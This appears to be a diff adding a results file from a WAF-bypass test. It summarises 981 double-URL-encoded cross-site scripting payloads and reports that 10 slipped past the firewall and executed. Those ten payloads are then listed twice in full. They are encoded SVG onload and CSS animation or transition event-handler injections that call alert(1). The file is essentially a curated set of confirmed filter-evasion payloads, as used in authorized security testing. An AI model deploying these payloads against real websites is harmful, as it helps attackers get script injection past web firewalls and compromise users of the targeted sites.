@@ -1,0 +1,37 @@
+================================================================================
+File: double_url_encode.txt - Summary
+================================================================================
+Total Tested: 981
+Bypassed (WAF): 10
+Blocked (WAF): 971
+Bypass Rate: 1.02%
+
+>>> EXECUTED (Confirmed Success): 10
+>>> Execution Rate: 1.02%
+================================================================================
+
+EXECUTED PAYLOADS (Payload will trigger on server):
+--------------------------------------------------------------------------------
+%253Csvg%253E%253Cblockquote%2520onload%253Dalert%25281%2529%253E%253C%252Fblockquote%253E
+%2522%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Cmain%2520style%253D%2522%2522animation-name%253Ax%2522%2522%2520onanimationend%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Fmain%253E%2522
+%253Csvg%253E%253Coption%2520onload%253Dalert%25281%2529%253E%253C%252Foption%253E
+%2522%253Cstyle%253E%253Atarget%2520%257Btransform%253A%2520rotate%2528180deg%2529%253B%257D%253C%252Fstyle%253E%253Cvar%2520id%253Dx%2520style%253D%2522%2522transition%253Atransform%25202s%2522%2522%2520ontransitionrun%253Dalert%25281%2529%253E%253C%252Fvar%253E%2522
+%253Csvg%253E%253Cbutton%2520onload%253Dalert%25281%2529%253E%253C%252Fbutton%253E
+%2522%253Cstyle%253E%2540keyframes%2520slidein%2520%257B%257D%253C%252Fstyle%253E%253Crb%2520style%253D%2522%2522animation-duration%253A1s%253Banimation-name%253Aslidein%253Banimation-iteration-count%253A2%2522%2522%2520onanimationiteration%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Frb%253E%2522
+%2522%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Caddress%2520style%253D%2522%2522animation-name%253Ax%2522%2522%2520onanimationstart%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Faddress%253E%2522
+%253Csvg%253E%253Crb%2520onload%253Dalert%25281%2529%253E%253C%252Frb%253E
+%2522%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Ccite%2520style%253D%2522%2522animation-name%253Ax%2522%2522%2520onanimationstart%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Fcite%253E%2522
+%2522%253Cstyle%253E%253Atarget%2520%257Btransform%253A%2520rotate%2528180deg%2529%253B%257D%253C%252Fstyle%253E%253Ctt%2520id%253Dx%2520style%253D%2522%2522transition%253Atransform%25202s%2522%2522%2520ontransitionrun%253Dalert%25281%2529%253E%253C%252Ftt%253E%2522
+
+ALL BYPASSED PAYLOADS:
+--------------------------------------------------------------------------------
+%253Csvg%253E%253Cblockquote%2520onload%253Dalert%25281%2529%253E%253C%252Fblockquote%253E
+%2522%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Cmain%2520style%253D%2522%2522animation-name%253Ax%2522%2522%2520onanimationend%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Fmain%253E%2522
+%253Csvg%253E%253Coption%2520onload%253Dalert%25281%2529%253E%253C%252Foption%253E
+%2522%253Cstyle%253E%253Atarget%2520%257Btransform%253A%2520rotate%2528180deg%2529%253B%257D%253C%252Fstyle%253E%253Cvar%2520id%253Dx%2520style%253D%2522%2522transition%253Atransform%25202s%2522%2522%2520ontransitionrun%253Dalert%25281%2529%253E%253C%252Fvar%253E%2522
+%253Csvg%253E%253Cbutton%2520onload%253Dalert%25281%2529%253E%253C%252Fbutton%253E
+%2522%253Cstyle%253E%2540keyframes%2520slidein%2520%257B%257D%253C%252Fstyle%253E%253Crb%2520style%253D%2522%2522animation-duration%253A1s%253Banimation-name%253Aslidein%253Banimation-iteration-count%253A2%2522%2522%2520onanimationiteration%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Frb%253E%2522
+%2522%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Caddress%2520style%253D%2522%2522animation-name%253Ax%2522%2522%2520onanimationstart%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Faddress%253E%2522
+%253Csvg%253E%253Crb%2520onload%253Dalert%25281%2529%253E%253C%252Frb%253E
+%2522%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Ccite%2520style%253D%2522%2522animation-name%253Ax%2522%2522%2520onanimationstart%253D%2522%2522alert%25281%2529%2522%2522%253E%253C%252Fcite%253E%2522
+%2522%253Cstyle%253E%253Atarget%2520%257Btransform%253A%2520rotate%2528180deg%2529%253B%257D%253C%252Fstyle%253E%253Ctt%2520id%253Dx%2520style%253D%2522%2522transition%253Atransform%25202s%2522%2522%2520ontransitionrun%253Dalert%25281%2529%253E%253C%252Ftt%253E%2522
